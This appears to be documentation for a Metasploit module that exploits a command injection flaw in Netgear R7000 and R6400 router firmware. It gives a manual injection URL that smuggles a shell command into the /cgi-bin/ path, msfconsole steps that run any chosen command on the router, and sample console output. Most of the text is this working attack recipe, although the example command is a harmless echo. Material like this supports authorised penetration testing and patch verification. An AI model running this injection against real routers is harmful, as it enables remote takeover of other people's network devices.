The netgear_r7000_command_injection module exploits a command injection vulnerability in Netgear R7000 and R6400 router firmware version `1.0.7.2_1.1.93` and possibly earlier. The vulnerability is found in the `/cgi-bin/` folder of the router. A manual injection would look like so: `http://<RouterIP>/cgi-bin/;echo$IFS"cowsay"`. This will echo 'cowsay' on the router. 


## Vulnerable Application

Netgear R7000 and R6400 routers running firmware version `1.0.7.2_1.1.93` and possibly earlier.

## Verification Steps

  2. Start msfconsole
  3. Do: `use auxiliary/scanner/http/netgear_r7000_command_injection`
  4. Do: `set RHOST <RouterIP>`
  5. Do: `set CMD "Command to execute"`
  6. Do: `run`
  5. If the router is running the vulnerable firmware, the command should run.

## Options

  **RHOST**

  This should usually be the local IP address of the vulnerable router.

  **CMD**

  This is the command to execute on the router. if you input spaces, they will be converted to `$IFS` when running the command.

## Scenarios

  Sample output of what it should look like. 

  ```
  msf > use auxiliary/scanner/http/netgear_r7000_command_injection
msf auxiliary(netgear_r7000_command_injection) > options

Module options (auxiliary/scanner/http/netgear_r7000_command_injection):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CMD                       yes       Command line to execute
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                     yes       The remote target address
   RPORT    80               yes       The target port
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host

msf auxiliary(netgear_r7000_command_injection) > set CMD echo "cowsay"
CMD => echo 'cowsay'
msf auxiliary(netgear_r7000_command_injection) > set RHOST 192.168.1.1
RHOST => 192.168.1.1
msf auxiliary(netgear_r7000_command_injection) > check
[*] 192.168.1.1:80 The target service is running, but could not be validated. 
msf auxiliary(netgear_r7000_command_injection) > run

[*] Sending request to 192.168.1.1
[*] Auxiliary module execution completed
msf auxiliary(netgear_r7000_command_injection) > 
  ```

